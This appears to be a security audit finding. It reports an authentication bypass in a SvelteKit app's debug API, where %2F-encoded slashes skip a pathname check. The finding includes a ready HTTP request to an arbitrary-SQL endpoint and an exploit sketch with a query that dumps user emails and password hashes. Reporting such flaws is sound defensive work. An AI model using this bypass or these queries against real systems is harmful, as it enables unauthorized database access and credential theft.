---
Phase: 3
Sequence: 002
Slug: debug-api-auth-bypass-url-encoding
Verdict: VALID
Severity-Original: HIGH
Confidence: high
Source-Drafts:
  - piolium/findings-draft/longshot-cad49483-001-auth-bypass-url-encoding.md
---

## Summary

The debug API authentication gate in `hooks.server.ts` uses `event.url.pathname.startsWith('/api/debug/')` to protect all `/api/debug/*` endpoints behind a Bearer token. However, SvelteKit preserves `%2F` (URL-encoded `/`) in `event.url.pathname`, and SvelteKit's routing engine matches encoded slashes to the same route handlers as literal slashes. An attacker can bypass authentication on all 17 debug endpoints — including the arbitrary SQL endpoint `/api/debug/sql` — by substituting `%2F` for `/` in the URL path (e.g., `/api%2Fdebug%2Fsql`). This requires no token.

## Affected Files

- `apps/web/src/hooks.server.ts:8-13` — auth check uses undecoded `event.url.pathname`
- `node_modules/@sveltejs/kit/src/runtime/server/respond.js:72` — `new URL(request.url)` preserves `%2F`
- `node_modules/@sveltejs/kit/src/utils/routing.js:217-226` — `escape()` function converts `/` to `%2[Ff]` in route patterns, confirming SvelteKit routes encoded slashes
- All 17 `/api/debug/*` endpoint files (no defense-in-depth auth)

## Root Cause

The auth gate compares `event.url.pathname` (which preserves `%2F` as-is) against the literal string `'/api/debug/'`. A request to `/api%2Fdebug%2Fsql` has `pathname = '/api%2Fdebug%2Fsql'` which does not start with `/api/debug/`, so the auth check is skipped. Meanwhile, SvelteKit's routing engine matches the encoded path and dispatches it to the same handler, bypassing the sole authentication mechanism.

## Attacker Control

The attacker sends an HTTP request with `%2F` substitutions:

```
GET /api%2Fdebug%2Fsql HTTP/1.1
Host: target.airways.gg
Content-Type: application/json

{"sql": "SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'"}
```

No `Authorization` header is required.

## Impact

- **Complete unauthenticated access to all debug endpoints**: 17 endpoints including raw SQL execution, flight data, positions, weather, push subscriptions, scraper logs, notification data
- **Database exfiltration**: The `/api/debug/sql` endpoint with `sql.raw()` allows arbitrary SELECT queries, exposing `users` (email + password_hash), `sessions` (tokens), and all flight data
- **Combination with SQL validation bypasses** (curated finding 003): Once past auth, all keyword-bypass techniques become accessible

## Evidence

**Auth gate — pathname comparison** (`apps/web/src/hooks.server.ts:8-13`):
```typescript
if (event.url.pathname.startsWith('/api/debug/')) {
    const auth = event.request.headers.get('authorization');
    if (!validateDebugToken(auth, env.DEBUG_API_TOKEN)) {
      return json({ error: 'Unauthorized' }, { status: 401 });
    }
}
```

**SvelteKit preserves %2F in pathname** (`respond.js:72`):
```javascript
const url = new URL(request.url);
```
The WHATWG URL parser preserves `%2F` in `pathname` since it represents a literal `/` not meant as a path separator.

**SvelteKit route patterns match %2F** (`routing.js:217-226`):
```javascript
.replace(/\//g, '%2[Ff]')
```
The comment explicitly states: `"replace %2F with their encoded versions because decode_pathname leaves them untouched"`. This confirms encoded slashes are intentionally routed to the same handlers.

**No defense-in-depth auth** in any debug endpoint — grep for `validateDebugToken` across all `/api/debug/*` files returns zero matches.

## Exploit Sketch

1. Send `GET /api%2Fdebug%2Fsql` with body `{"sql": "SELECT email, password_hash FROM users"}`
2. Auth check is skipped (pathname doesn't start with `/api/debug/`)
3. SvelteKit routes to the SQL debug endpoint, which executes the query
4. Attacker receives all user credentials in the response
5. Same technique works for all other debug endpoints

## Confidence Notes

HIGH confidence — the bypass was verified against SvelteKit 2.21.0 source code (`routing.js` escape function and `respond.js` URL construction). The `%2[Ff]` regex in routing.js explicitly confirms SvelteKit's intent to match encoded slashes. The only caveat is that a reverse proxy (nginx, Cloudflare) between the attacker and the SvelteKit server might normalize `%2F` before forwarding — this cannot be verified without deployment configuration access.
